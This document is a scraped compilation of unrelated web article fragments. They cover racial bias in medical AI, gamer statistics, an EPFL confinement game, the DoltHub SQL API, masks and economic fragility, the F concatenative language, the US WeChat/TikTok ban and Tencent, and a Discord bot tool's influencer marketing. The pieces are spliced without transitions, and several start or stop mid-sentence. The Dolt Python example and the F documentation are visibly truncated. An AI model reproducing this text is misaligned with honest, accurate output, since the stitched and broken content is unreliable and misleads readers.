<p>But that doesn’t appear to have happened. Nelson points to “lots of stories of people who have gone to the hospitals and emergency rooms <a href="https://www.cbsnews.com/news/rana-zoe-mungin-brooklyn-teacher-coronavirus-dies-denied-testing/">two</a>, three, <a href="https://www.nbcnews.com/news/us-news/detroit-health-care-worker-dies-after-being-denied-coronavirus-test-n1192076">four times</a>,” and still testing was denied because “it was not believed that they were sick enough. These were African Americans who had Covid-19” and some later died, she adds.</p>



<p>Obermeyer recently spent time working at a hospital in Navajo Nation, a Native American reservation with some of the <a href="https://www.bbc.com/news/world-us-canada-52941984">highest</a> per capita Covid-19 infection rates in the United States. Navajo Nation’s health care infrastructure is “under-resourced,” says Obermeyer, and that can create a vicious cycle, similar to the one his team uncovered in their study of the AI-powered algorithm: If an underserved population lacks access to Covid-19 testing, then that population might look like it’s doing relatively well, even when it isn’t. This, in turn, may lead to fewer resources being allocated — and a delayed understanding of the full scope of the problem.</p>



<hr>



<p>Racial bias has also been demonstrated in AI-powered medical diagnostic applications with a very particular nuance: The algorithms are less accurate diagnosing conditions on darker skin.&nbsp;</p>



<p><a href="https://undark.org/2017/05/17/facial-recognition-technology-biased-understudied/">The phenomenon is not new</a>. Facial recognition systems used by law enforcement, for example, are notoriously less accurate at identifying African American faces. Some of the relatively few studies documenting the problem have suggested up to 10 percent less accuracy compared to White faces. Self-driving auto technologies are also <a href="https://arxiv.org/abs/1902.11097">less accurate</a> at recognizing pedestrians with darker skin — a situation that could have fatal consequences.</p>



<p>In medicine, machine learning has been used to create programs capable of distinguishing between images of benign and malignant moles. But a 2018 paper in <a href="https://jamanetwork.com/journals/jamadermatology/article-abstract/2688587">JAMA Dermatology</a> warned that “no matter how advanced the [machine learning] algorithm, it may underperform on images of lesions in skin of color.” This is because the training sets for the algorithms are not diverse, says <a href="https://dellmed.utexas.edu/directory/ade-adamson">Adewole Adamson</a>, a dermatologist and assistant professor at …</p></div></div>

<p>By mid-2020, the number of people playing video games had grown to 3.1 billion, according to <a href="https://www.dfcint.com/product/video-game-consumer-segmentation-2/">DFC Intelligence</a>. Considering that in July the total population of the Earth exceeded 7.8 billion, just under 40% are familiar with games.</p>




<p>Analysts point out that almost half of the accounted three billion are those who play only on smartphones or mobile devices. This segment is also ahead of all others in terms of growth.</p>



<p>However, only about 250 million people are active console users who regularly buy new games for them. Although they represent only 8% of the total number of gamers, this is the group with the highest revenue per person.</p>



<p>1.5 billion are playing on PC – 48% of all gamers. However, this number includes not only regular users but also those who also enjoy video games on consoles and mobile platforms.</p>



<p>More than half of the world’s gamers live in Asia – there are 1.42 billion players there. Moreover, this region also accounts for 53% of people who play only on smartphones. The top four also include Europe (668 million), Latin America (383 million) and North America (261 million).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p> An interactive video game created by researchers and students in the EPFL College of Humanities (CDH) and UNIL Gamelab, in collaboration with the Initiative for Media Innovation (IMI) and Le Temps, allows users to explore a series of digital narratives that bear witness to the period of pandemic-induced isolation.<br></p><div id="news-content-text" itemprop="description"><p>Would you let your children play in the park? How can you stay focused during your distance-learning course? Who are you going to call to pass the time while semi-confined? People across the world are dealing with these questions, and many more, as social distancing and confinement have become key strategies for fighting the coronavirus pandemic.</p><p>For <a href="https://www.epfl.ch/schools/cdh/">CDH</a> scientist and <a href="https://wp.unil.ch/gamelab/">UNIL Gamelab</a> researcher Yannick Rochat, an expert in game studies and digital humanities, a narrative video game seemed like a natural medium for exploring these questions, and how different people struggle to respond to them in different ways.</p><p>“Video games can convey information as well as emotions. The idea behind this game is to have a testimony to this period in history that has impacted us all. For a newspaper like <em>Le Temps</em> and for a researcher like myself, it is important to document and keep an account of these experiences,” he says.</p><p>On August 20<sup>th</sup>, Rochat and a team of collaborators from the worlds of gaming, programming, and graphic design released “<a href="https://labs.letemps.ch/interactive/2020/quatre-apparts-un-confinement/">Quatre apparts et un confinement</a>” (Four Condos and a Containment): a series of interactive, choose-your-own-adventure stories that dramatize the lives of four fictitious neighbors in the same building.</p><p><strong>Confinement through the eyes of others</strong></p><p>The francophone game was developed in June and July, 2020, thanks to the (socially distanced) collaboration of <a href="https://www.media-initiative.ch/">IMI</a> Director Mounir Krichane, <em>Le Temps</em> journalist Paul Ronga, graphic designer Mathias Hängärtner, EPFL student Andrew Dobis, and UNIL student Saara Jones. It is hosted on <em>Le Temps’</em> website and mobile app.</p><p>Users can click through the digital apartments, visiting each character and participating briefly in their lives: their decisions, their worries, their desires, or their frustrations. Some experiences may seem familiar to users, while some present a window into what others may be feeling during confinement.</p><p>“This video game allows us to tell the story of confinement from different angles, while allowing the player to participate. This represents an important opportunity to relive confinement, but from the perspective of another person – for example, a single mother, an elderly woman, or a student,” Rochat explains. He adds that the mobile-friendly, point-and-click format was inspired in part by narrative video games like <a href="https://annapurnainteractive.com/games/florence/">Florence</a>, but with the added complexity of text and dialogue.</p><p>IMI Director Mounir Krichane also explains that beyond the game’s instructive aspect, which reflects educational offerings <a href="http://isa.epfl.ch/imoniteur_ISAP/!itffichecours.htm?ww_i_matiere=2708194715&amp;ww_x_anneeAcad=1866895046&amp;ww_i_section=116995070&amp;ww_i_niveau=2936295&amp;ww_c_langue=en">at EPFL</a> and <a href="https://applicationspub.unil.ch/interpub/noauth/php/Ud/ficheCours.php?v_enstyid=79083&amp;v_blocid=&amp;v_ueid=174&amp;v_langue=en&amp;v_isinterne=">at UNIL</a> on video games, “Quatre apparts” is also a way for IMI and its partners to explore new modes of storytelling, including interactive formats.</p><p>“With most media organizations now facing the question of audience renewal, interactive formats are a way to remain relevant to changing audiences while also attracting new ones, especially among younger generations,” he says.</p><p>Thanks to its <a href="https://github.com/IMI-initiative/quatre-apparts-et-un-confinement">open-source code</a>, the creators also emphasize that other media and institutions are invited to publish or adapt the unique gaming experience, for example into other languages.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p><a href="https://doltdb.com/">Dolt</a> is <a href="https://www.dolthub.com/blog/2020-03-06-so-you-want-git-for-data/">Git for data</a>,
a relational database built to create, publish and consume datasets.
<a href="https://www.dolthub.com/">DoltHub</a> hosts a growing collection of public open datasets stored as Dolt databases.
Dolthub allows you explore data through its SQL <a href="https://www.dolthub.com/repositories/Liquidata/nba-players/query/master?q=SELECT%20full_name%2C%20abbreviation%2C%20year_founded%20FROM%20%60teams%60%20LIMIT%20200%3B&amp;active=Tables">query interface</a>.
We're excited to announce that you can now query Dolthub datsets via the SQL API. </p>
<h2>How it works</h2>
<p>Dolthub's SQL API exposes repository data via an HTTP endpoint at <code>www.dolthub.com/api/v1alpha1</code>.
Query parameters are encoded in the URL in the form of:</p>
<div data-language="text"><pre><code>https://www.dolthub.com/api/v1alpha1/&lt;owner_name&gt;/&lt;repo_name&gt;/&lt;branch_name&gt;?q=&lt;sql_query&gt;</code></pre></div>
<p>The &lt;sql_query&gt; is specified as a query string keyed by "q". Any valid SQL read query is acceptable.</p>
<h2>An Example</h2>
<p>Basketball is back y'all!
The NBA bubble is fully inflated and sports fans out there are getting a much appreciated distraction from the day-to-day.</p>
<p><img src="https://www.dolthub.com/blog/2fdc8439bb19fa2e316349efbd30c89f/dame.gif" alt="It's Dame Time!"></p>
<p>The NBA hit pause on the regular season all the way back in March, so let's check out Dolthub's
<a href="https://www.dolthub.com/repositories/Liquidata/nba-players"><code>nba-players</code></a> dataset and figure out where we left off.
We'll use Python's <code>requests</code> library as a simple way to hit the API.</p>
<div data-language="python"><pre><code><span>&gt;&gt;</span><span>&gt;</span> <span>import</span> requests

            <span>.</span><span>.</span><span>.</span>
        <span>]</span>
<span>}</span></code></pre></div>
<p>The response gives some general metadata about the query as well as the schema of the query and its result rows.
A couple things to note here: &lt;branch_name&gt; and &lt;sql_query&gt; are optional parameters.
If they're not specified they default to 'master' and 'SHOW TABLES' respectively.
The nba-players dataset includes all of this season's stat totals up to the March stoppage.

<p>This is a great example of the power of the SQL API.
You can execute joins against that API rather than having to fetch all the data and compute the matches yourself.</p>
<p>Why Harden is a distant third in the MVP race... we'll never know.
Speaking of Harden getting robbed, back in December this <a href="https://www.dolthub.com/blog/3e540a6d7ace830b78359178d9eb2afe/harden.mp4">happened</a>.
Harden's dunk wasn't counted and could not be overturned with video replay. (The Rockets went on to lose in double OT.)
Thankfully Liquidata has corrected the record on a <a href="https://www.dolthub.com/repositories/Liquidata/nba-players/compare/james-harden-basket-counts/asp1h2qhi1k8otrnk5o6jv87doahqn7v">separate branch</a> within this repo.

<p>The flexibility of the SQL API allows you to do anything you want with your data.
You can use the API to fetch data for visualization or as a simple backend for web app.
The SQL API is currently in alpha.
It's shape may change over time, but the basic principle of data access through SQL will remain.
The API is built of top of Dolt's SQL engine powered by <a href="https://github.com/liquidata-inc/go-mysql-server"><code>go-mysql-server</code></a>
so it's performance and compatibility are improving on a weekly basis.
Checkout our SQL support on <a href="https://github.com/liquidata-inc/go-mysql-server">Dolthub</a>.
We're excited to see how the SQL API gets used in the wild.

<hr>
<p><span>I heard a story recently about 3M (</span><a href="https://www.dictionary.com/e/acronyms/h-t/"><span>h/t</span></a><span>: frequent commenter Boonton). Supposedly, back during the SARS outbreak they decided they should build in some “surge capacity” around the construction of N95 masks. Enough additional capacity that they could double their production at a moment’s notice. It was unclear if they actually did that or if they were just thinking about it. And even if they had, it appears that the scope of the current crisis is great enough that it’s not as if this one decision would have dramatically altered the outcome. Still it’s hard to dispute that it would have helped.&nbsp;</span></p>
<p><span>The question which immediately suggests itself is how would the market have treated this development? In fact imagine that there were two companies, one who took some portion of their profits and plowed them back into various measures which would help in the event of a crisis and one that didn’t. How do you imagine that the stock market and investors would price these two companies? I’m reasonably certain that the latter, the one who took the profits and disbursed them as dividends, or found some other use for them, would end up with a higher valuation, all else being equal. In other words I would very much expect Wall Street to have punished 3M for this foresight, particularly over a sufficiently long time horizon where there were no additional epidemics, but even in the few years between doing it and needing it.</span></p>
<p><span>What this story illustrates is that attempts to maximize the efficiency of an economic system also have the effect of increasing and possibly maximizing the fragility as well. And while, in general, I don’t have much to say about the Coronavirus which hasn’t been said already and better by someone else. I do think that this may be one of the few areas where not enough has been said already and where I might, in fact, have something useful to add to the discussion.&nbsp;</span></p>
<p><span>To begin, I want to turn from examining the world we have to looking at the world we wished we had, at least with respect to the virus. And as long as we’re already on the subject of masks we might as well continue in this vein.&nbsp;</span></p>
<p><span>As the pandemic progresses one of the big things people are noticing is the difference in the number of infections between the various countries. In particular South Korea, Japan and Taiwan have done much better than places like Italy and Spain. There are of course a number of reasons for why this might be, but there’s increasing anecdotal evidence indicating that the availability of masks might be one part of the equation.&nbsp;</span></p>
<p><span>For example, Taiwan is very closely connected to China, and one might expect that they would have gotten the virus quite early. Probably before people really understood what was going on, but definitely well before the recent policies of social distancing really started to be implemented to say nothing of a full on quarantine, and yet somehow, they only have 235 infections, which as of this writing puts them below Utah!</span></p>
<p><span>There are of course numerous reasons for why this might be, but I’m more and more inclined to believe that one big factor is that Taiwan is a mask producing juggernaut. In fact as recently as a few days ago they pledged to send </span><a href="https://www.taiwannews.com.tw/en/news/3899531"><span>100,000 masks a week to us</span></a><span>. They can make this gesture (and I know 100k is actually just a drop in the bucket) because they’re currently producing </span><a href="https://focustaiwan.tw/business/202003090013"><span>10 million masks a day</span></a><span>! For a country that only has 24 million people. Meaning that while that won’t quite cover one mask per day per person it’s enough that if people avoid leaving the house unnecessarily and if some masks can be reused they have enough for everyone to be wearing one at all times when they’re out of doors.</span></p>
<p><span>South Korea is similar and the big challenge there was not that they weren’t producing enough masks, but to </span><a href="https://abcnews.go.com/International/south-korea-takes-measures-face-masks-domestically-amid/story?id=69254114"><span>stop exporting the masks</span></a><span> they were already making. Finally reports out of Japan indicate that about 95% of people are wearing masks. But more importantly reports were that even before the pandemic around 30-40% were wearing masks just as a matter of habit. Is it possible that this slowed things down enough to allow them to get on top of it once the true scale of the crisis was apparent?</span></p>
<p><span>As I was writing this post I did some research on the topic, but before the post was finished Scott Alexander of Slate Star Codex came along, as he frequently does, and released </span><a href="https://slatestarcodex.com/2020/03/23/face-masks-much-more-than-you-wanted-to-know/"><span>Face Masks: Much More Than You Wanted to Know</span></a><span> which is a very thorough examination of the mask question. What he found mostly supports my point, and in particular this story was fascinating:</span></p>
<p><em><span>Some people with swine flu travelled on a plane from New York to China, and many fellow passengers got infected. Some researchers </span></em><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3810906/"><em><span>looked at whether</span></em></a><em><span> passengers who wore masks throughout the flight stayed healthier. The answer was very much yes. They were able to track down 9 people who got sick on the flight and 32 who didn’t. 0% of the sick passengers wore masks, compared to 47% of the healthy passengers. Another way to look at that is that 0% of mask-wearers got sick, but 35% of non-wearers did. This was a significant difference, and of obvious applicability to the current question.</span></em></p>
<p><span>On the other hand, when we turn to the US and Europe, in contrast to Southeast Asia, there is definitely not a culture of mask-wearing and even if there had been, most of those countries apparently imported masks from places like Taiwan and China (a point I’ll return to) meaning that when those countries stopped exporting masks there were even fewer available here, enough that people started worrying about not having even enough for the healthcare providers. Once this problem became apparent various authorities started telling people that masks were ineffective. A policy which has since been called out for not merely being wrong, but </span><a href="https://www.nytimes.com/2020/03/17/opinion/coronavirus-face-masks.html"><span>contradictory, counterproductive and undermining trust in the authorities at a time when they needed it most.</span></a><span>&nbsp;</span></p>
<p><span>For most people, myself included, it’s just common sense that wearing a mask helps, the only question is how much? Based on evidence out of the countries just mentioned, and the SSC post I would venture to say that they help quite a bit. Also they’re cheap. Particularly when weighed against the eventual cost of this pandemic.</span></p>
<p><span>We’ve all learned many new things since the pandemic began, one of the things I didn’t realize was how bad the </span><a href="https://en.wikipedia.org/wiki/Severe_acute_respiratory_syndrome"><span>SARS</span></a><span> epidemic was and how much the current precautions and behavior of the Southeast Asian countries is based on l</span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3320446/"><span>essons learned during that epidemic</span></a><span>. And while it’s understandable that I might have missed that (particularly since I didn’t start blogging until 2016) the CDC and the federal government on the other hand should have been paying </span><em><span>very close attention</span></em><span>. In fact, you would have expected that they might have taken some precautions in case something like that happened again or worse, started in the US. (Though to be fair, we don’t have wet markets, if that is where it started. As if we didn’t already have enough conspiracy theories.) Instead the US Government’s response has been borderline criminal. (Other people have done a much better job of talking about this than I could, but if you’re interested in a fairly short podcast just about the delay of testing that avoids sensational accusations, check out this </span><a href="https://www.npr.org/2020/03/18/818072542/episode-981-how-to-test-a-country"><span>Planet Money episode</span></a><span>.)</span></p>
<p><span>To continue using the example of masks, I think it’s worth asking what it would have taken for the government to have a one month supply for every single person in the country. Stockpiled against a potential pandemic. According to this </span><a href="https://www.wired.com/story/covid-19-amazon-curb-face-mask-price-gouging/"><span>Wired article</span></a><span>, before the pandemic 100 disposable masks were going for $3.75, let’s be conservative and round up and say that masks cost 4 cents a piece. From there the math is straightforward: 330 million people X 30 days X $0.04, is ~$400 million dollars, or 3% of the CDCs budget, or less than what the federal government spends in an hour. Still, I’ll agree, that’s a fair amount of money. But remember that’s the </span><em><span>absolute maximum</span></em><span> it would cost. I’d actually be surprised if once you factored in the huge economy of scale that we couldn’t do it for a 10th of that or even a 20th of that. And it would presumably have been cheaper still to just buy the necessary machinery for making masks and then mothball it, with a “break in case of emergency” sign on the door. Once you factor in all the potential cost savings, it’s hard to imagine that this would have cost more than $25 million (in fact if the government wants to offer me a $25 million contract to make it happen for next time I would be happy to take it.) And when you consider that it’s probably going to end up costing the US over a </span><a href="https://www.weforum.org/agenda/2020/03/coronavirus-covid-19-cost-economy-2020-un-trade-economics-pandemic/"><span>trillion dollars</span></a><span>, plus the expected odds of something like this happening, you start to wonder why on earth they didn’t do this </span><em><span>and countless other things</span></em><span> that might have come in handy. (A strategic toilet paper reserve? I’m just saying.)</span></p>
<p><span>When you consider all of the budgetary cuts that were proposed for the CDC, which have </span><a href="https://www.politifact.com/factchecks/2020/feb/28/michael-bloomberg/did-donald-trump-fire-pandemic-officials-defund-cd/"><span>emerged in the wake</span></a><span> of the pandemic, and which generally involved only tens of millions of dollars, it seems unlikely that even $25 million would be allocated just for masks, but why is that? With a federal budget of $3.8 trillion why are we so concerned about $25 million? (It’s the equivalent of worrying about $25 when you make $3.8 million a year.) I understand people who are opposed to government spending, </span><a href="https://wearenotsaved.com/2017/10/21/the-nation-debt-in-three-lists-of-six-items/"><span>heck I’m one of them</span></a><span>, but this also seems like one of those classic cases where people balk at spending anything to prevent a crisis, while somehow simultaneously being willing to bury the problem in a </span><em><span>giant mountain of money</span></em><span> once the crisis actually hits. It would be one thing if we refused to spend the money regardless of the circumstances, but if recent financial news is any indication we’re obviously willing to spend whatever it takes, just not in any precautionary way. …</span></p></div></div>

<p><a href="http://www.nsl.com/k/f/f.k">F</a> is a pure functional concatenative 
language originally designed as an extension of <a href="http://www.nsl.com/papers/false.htm">False</a>. F contains the list-operations of <a href="http://www.kx.com/">K3</a> and the <em>dip</em> combinator 
of <a href="http://www.latrobe.edu.au/philosophy/phimvt/joy.html">Joy</a>. Floating-point and symbolic datatypes are supported. One-time assignment
is enforced in syntax. A theory of function-valence and -charge is outlined. F also contains a general continuation
primitive $, and the pattern sublanguage of <a href="http://www.nsl.com/k/xy/xy.htm">XY</a>.  <a href="http://www.nsl.com/k/f/g.k">G</a> is a variant of F in which the K3 adverbs are implemented as primitives.</p>

<h2>0. Introduction</h2>

<p>F has the following properties:</p>

<blockquote>
    <ul>
        <li>The language is concatenative</li>
        <li>The language is purely functional</li>
        <li>All K verbs are implemented</li>
        <li>All primitives are denoted by single symbols</li>
        <li>Primitive symbols are as mnemonic as possible</li>
    </ul>
</blockquote>

<p><em>The language is concatenative.</em> F tokens are words,
words denote functions, and the concatenation of words denotes
the composition of functions. In classical concatenative
languages, everything is a function from stacks to stacks. In F,
everything is a function from triples of
(environment;stack;queue) to triples of
(environment;stack;queue).</p>

<p><em>The language is purely functional.</em> There are no
side-effects. F has assignment, but not reassignment. This means
that you can't use a variable to store dynamic state. F
assignment associates names with values in an environment which
is passed as an argument and returned as a value. F also has
commands for interacting with the run-time environment and the
file-system, but these operations are notationally differentiated
from the operators of F: "h", "r", &amp;c.
They are intended as debugging aids only.</p>

<p><em>All K verbs are implemented.</em> Some K verbs are
implemented as primitives, and some are derived in the F prelude.
For example, the <em>atom</em> primitive @ of K is defined as
[#ints~]; i.e. shape matches the empty integer vector. Where K
provides a pair of functions, one of which is easily defined in
terms of the other, F implements one as a primitive and derives the
other. For example, <em>and</em> is primitive (&amp;) and <em>or</em>
is derived.  The criterion for dividing related pairs is simply
this:  the derived definition must not be egregiously inefficient
when compared to the primitive it supplants.</p>

<p><em>All primitives are denoted by single symbols.</em>
Although list-notation ([x y z]) is supported, any list can be
constructed functionally with ' (<em>quote</em>) and , (<em>join</em>).</p>

<p><em>Primitive symbols are as mnemonic as possible.</em> There
are five ways the mapping of a function to a symbol can be
mnemonic:</p>

<blockquote>
    <ol>
        <li>The symbol is in common use for the mapped function
            (e.g. + for addition)</li>
        <li>The symbol is mapped to that function in K (e.g. ?
            for <em>find</em>) or False (e.g. ! for <em>unquote</em>)</li>
        <li>The name of the symbol is a homonym for the mapped
            function (e.g. ' for <em>quote</em>)</li>
        <li>A pair of related functions (inverses, or
            near-inverses) are mapped to a pair of related
            symbols (e.g. / and \ for <em>take</em> and <em>drop</em>)</li>
        <li>Where several K primitives are mapped to one symbol,
            the primitives should form an easily remembered group
            based on some common property; e.g. both <em>upgrade</em>
            and <em>enum</em> return indices based on an
            ascending relation, so both are mapped to &lt;. </li>
    </ol>
</blockquote>

<h2>1. Datatypes</h2>

<p>The initial state of the interpreter consists of an
environment containing the F words of the prelude, an empty
result stack, and a string (character-vector) to be evaluated.
The input string is tokenized and parsed to obtain the initial
queue. </p>

<p>The input queue is a K list, possibly containing integers,
floats, symbols, <em>null</em>, functions, and lists
("quotations"). The result stack is initially empty.
The environment is a K dictionary. F processes the environment,
stack, and queue repeatedly until the queue is empty. </p>

<p>If the first item on the queue is an integer, float, <em>null</em>,
the prototype symbol `, or a list, the item is pushed onto the
stack.</p>

<p>If the first item is an undefined symbol, then if it's a <em>shuffle</em>
it's applied; otherwise, a variable is created (in the environment)
having the top of the stack as the value. </p>

<p>If the first item is a defined symbol, its value is
retrieved (from the environment) and pushed onto the stack.</p>

<p>If the first item is a function, then it is applied to the
environment, stack, and queue to produce a new environment,
stack, and queue.</p>

<p>Observe that the domain of the result stack is a proper subset
of the domain of the input queue. On the queue we may find
character-atoms, such as "r", and strings, such as
"blah". But character-atoms are executed away when they
are evaluated, and no F primitive ever produces one, and strings
are comments, which are not processed.</p>

<p>The <em>trace</em> command displays the stack and queue for
selected objects in the trace list T:</p>

<blockquote>

<h3>System Functions (K)</h3>

<p>The K system functions have reserved names:</p>

<blockquote>
    <pre>type (4::)
log exp abs sqr sqrt floor dot mul inv lsq
sin cos tan asin acos atan sinh cosh tanh
draw
in lin bin binl dv dvl di vs sv</pre>
</blockquote>

<h3>Literals (L)</h3>

<p>F has nine reserved names for literals:</p>

<blockquote>
    <pre>Nan		minint (0N)
Inf		maxint (0I)

nan		NaN (0n)
inf		infinity (0i)

null		null (_n)
sym		prototype sym (`)

ints		empty integer vector (!0)
floats		empty float vector (0#0.)
syms		empty sym vector (0#`)</pre>
</blockquote>

<h3>Commands (I)</h3>

<p>F has the following interactive commands:</p>

<blockquote>
    <pre>".."		comment		1 "skip" 2	comment not processed

"b"		break		'x "b"		signal error ('x)
"c"		clear		1 2 "c" 3 4	clear, load f, prelude
"d"		defined		'foo "d"	is foo defined?
"e"		error		0 "e"		set/unset error trap (\e)
"f"		F		"f" 2 unit!	set F semantics, clear
"j"		Joy		"j" 2 unit	set Joy semantics, clear
"k"		K		1 2 "k" 3 4	exit to K
"l"		load		'x "l"		load f/x.f|x.j
"m"		measure		[10&lt;] "m"	measure time in ms
"o"		words		'map "o"	show word form
"p"		precision	3 "p"		print precision (\p)
"r"		read		1 2 "r" 3 4	read, parse, eval

"w"		write		1 2 "w" 3 4	format, write
"z"		halt		1 2 "z" 3 4	: to continue
</pre></blockquote>

<h3>Names and numbers</h3>

<p>Spaces (<em>blank</em>, <em>tab</em>, <em>return</em>) are
necessary to separate names from names and numbers from numbers,
but not names from numbers.</p>

<p>A name must begin with a letter and may contain letters, .,
or a single -.  A name containing a - is a shuffle-symbol.</p>

<p>A numerical expression must begin with either a digit or - 
followed by a digit, and must end with a digit.  A floating-point 
numerical expression must contain exactly one . which
must be flanked by digits.</p>

<h3>Operators</h3>

<p>The math, logic, and relational operators are <em>atomic
functions</em>. For example,</p>

<blockquote>
    <pre>F&gt;[1 2 3][[4 5 6] 7 8]+
[[5 6 7] 9 11]</pre>
</blockquote>

<p>In several instances, distinct K operations have been mapped
to one symbol: </p>

<blockquote>
    <pre>int &lt;			enum			!x
~atom &lt;			upgrade			&lt;x
atom &lt;			nonce

int/ints @		where			&amp;x
list @			flip			+x
			nonce

atom y ?		mod			y!x
~atom y ?		find			x?y

list atom \		rotate			y!x
atom list \		drop			x _ y
atom atom \		drop			x _(),y
list list \		cut			x _ y

1=#x .			infra
x .			index/monad/dyad	. x</pre>
</blockquote>

<h3>Iterators</h3>

<p>The False combinators <em>if</em> and <em>while</em> have been
eliminated, and <em>cond</em>, <em>if</em>, and <em>while</em>
have been defined as words in the prelude. The truth-values of F
are more general than those of K: 0 is <em>false</em>, any other
value is <em>true</em>.</p>

<h3>Assignment</h3>

<p>Assignment has the form <em>value unassigned_name</em>. An
assigned name may not be re-assigned.</p>

<p>Reserved names cannot be assigned:</p>

<blockquote>
    <pre>F&gt;12 inf
12 inf</pre>
</blockquote>

<p>Use of an assigned name (a variable) places the value assigned
to it on the stack:</p>

<blockquote>
    <pre>F&gt;10 a

F&gt;a
10
F&gt;12 a
10 12 10
F&gt;a
10 12 10 10</pre>
</blockquote>

<p>A symbol can be produced indirectly:</p>

<blockquote>
    <pre>F&gt;10 foo

F&gt;foo
10
F&gt;[foo] first!
foo
F&gt;!
10</pre>
</blockquote>

<h3>Quotation</h3>

<p>The <em>quote</em> primitive ' takes the next item on the
queue and quotes it:</p>

<blockquote>
    <pre>F&gt;'+
[+]
F&gt;
F&gt;'[1 2 3]
[[1 2 3]]
F&gt;
F&gt;''
[']</pre>
</blockquote>

<p>The <em>unquote</em> combinator ! is Joy's <em>i</em>. ! takes
the top item <em>x</em> on the stack and prepends the elements of
<em>x</em> to the queue:</p>

<blockquote>
    <pre>F&gt;2 3 '+ !
5</pre>
</blockquote>

<p>The <em>dip</em> combinator is defined as it is in Joy. `
takes the top two items <em>x</em> <em>y</em> on the stack and</p></div>

<p>According to the <a href="https://twitter.com/AndrewFeinberg/status/1291545381453602821">decree</a>, from September 20, transactions between American companies and the owners of WeChat and TikTok will be prohibited. The first service, which is a messenger, is owned by Tencent.</p>




<p>In a statement to the LA Times, the White House administration <a href="https://www.latimes.com/politics/story/2020-08-06/trump-signs-executive-order-to-ban-tiktok">clarified</a> that in the case of Tencent, the ban only applies to transactions that are related to WeChat. That is, the decree should not affect companies like Riot Games — it is based in the United States, but it is fully owned by Tencent.</p>



<p>Tencent also owns stakes in Grinding Gear Games (Path of Exile), Yager (Spec Ops: The Line), Funcom (Conan Exiles) and Epic Games (Epic Games Store). In addition to gaming companies, Tencent has a share, for example, in Reddit and Spotify.</p>



<p>As <a href="https://twitter.com/nwadhams/status/1291580648952680465">noted</a> by Bloomberg, Apple and Google are at risk, since prohibited transactions may include placing apps in digital stores or, for example, buying ads in TikTok.</p>



<p>After the news of the decree, Tencent shares <a href="https://www.bloomberg.com/news/articles/2020-08-07/chinese-hong-kong-stocks-drop-after-trump-moves-to-ban-tencent">fell</a> by 10%, which caused the company’s market value to fall by $ 30 billion. This happened before the white house clarified the details of the ban.</p>



<ul><li><figure><img src="https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share.jpg" alt="" data-id="4779" data-link="https://nintendosmash.com/?attachment_id=4779" srcset="https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share.jpg 681w, https://nintendosmash.com/wp-content/uploads/2020/08/tencen-share-300x155.jpg 300w" sizes="(max-width: 681px) 100vw, 681px"></figure></li></ul>



<p>WeChat is the main messenger in China, which has an integrated payment system. Purchases are made through it, for example, in the local version of eShop on Switch, as well as an authorization on the Nintendo console in principle.</p>



<p>According to the decree, the app itself will not be blocked in the United States, but some local users are already <a href="https://twitter.com/xuhulk/status/1291561967451279362">concerned</a> since WeChat is the only messenger that can be used without a VPN to contact people in China.</p>



<p>Donald Trump announced his intention to block TikTok in the United States in early August, but Microsoft wants to prevent this. The company is in talks with the owner of the bytedance app and intends to buy out its business in the US and some other countries to avoid the ban.</p>



<p>ByteDance and Microsoft must conclude a deal by September 15, while the latter will also have to pay a certain amount to the US Treasury.</p>



<p>As for WeChat, Tencent will probably try to appeal the decision, but so far there has been no response from the conglomerate.</p>

    <article itemscope="" itemtype="http://schema.org/BlogPosting">
        

        <div itemprop="articleBody">
    

    <p>For the last few months, I’ve been reaching out to “micro influencers” on YouTube, with the hope of driving targeted traffic to my product, <a href="http://discordbotstudio.org/">http://discordbotstudio.org</a>. I’m classifying micro influencers as having between 1,000 – 10,000 subscribers on YouTube. The benefit of reaching channels of this size is that they have dedicated audiences based on a certain niche (in my case this is Discord Bots and the creation thereof).</p>

<p>Discord Bot Studio (DBS) is a visual programming tool I released on Steam on May 12th, 2020 (2 months prior to writing this). It’s a utility that lets users create Discord bots without needing to write any code, a task that usually requires programming knowledge. Up to this point I have sold about 1,000 copies of DBS, all through Steam. My only marketing efforts to this point have been SEO, through the landing page I’ve had setup for almost a year, and through Steam itself, where DBS is sold. I also grew a decently sized mailing list from the landing page, but I saw very poor conversion from that list. I’m content with the traffic I’m getting through SEO alone, but I recognize that I need to explore other marketing channels to continue to grow.</p>

<p>The basic strategy I followed was searching YouTube for channels that pertained to Discord bots, and the creation of Discord bots. I preferred channels that had some upload regularity, and consistent view counts. I would send these channels an email if I could find their address, and offer them a free copy of Discord Bot Studio in exchange for them hopefully creating a video about it. Most of the responses I got were positive, and many were open to at least trying out the product.</p>

<ul>
<li>📫 <strong>Emails Sent</strong>: ~55</li>
<li>💌 <strong>Response Rate</strong>: ~60%</li>
<li>🎥 <strong>Videos Created</strong>: 4 at the time of writing this</li>
<li>📈 <strong>Video Views</strong>: ~4,000</li>
<li>💰 <strong>My Costs Incurred</strong>: $0.00</li>
<li>💵 <strong>Sales Generated</strong>: Unknown. DBS is sold on Steam. Unfortunately Steam analytics and conversion tracking is super limited. They say this is because most purchases are made in the Steam desktop client, even if traffic originally arrives at the web page for the product. Anecdotally, I have spoken to a few customers who’ve told me they found DBS through the videos.</li>
</ul>

<p>It’s hard to tell at this point whether my efforts have, and will pay off. My hope is that these videos provide nearly evergreen marketing, since they will forever be on YouTube accruing views. I am happy with the amount of sales I’m currently making through organic traffic coming from Google and Steam. That being said, the traffic from those channels has leveled off, and I’m open to experimenting with new strategies to look for more growth opportunity. I think I will stop reaching out to YouTube influencers for the time being, and focus my marketing efforts elsewhere to find a strategy that sticks.</p>

<p>Being a low cost, one-time purchase product, it’s hard to imagine a scenario where any sort of paid advertising is going to work for DBS. With that in mind, I will continue to experiment with free, and low cost marketing channels which I haven’t tried yet. I believe the biggest potential opportunity is content marketing. Creating content obviously takes a lot of time, but it’s generally free, and therefore low risk for my young business.</p>

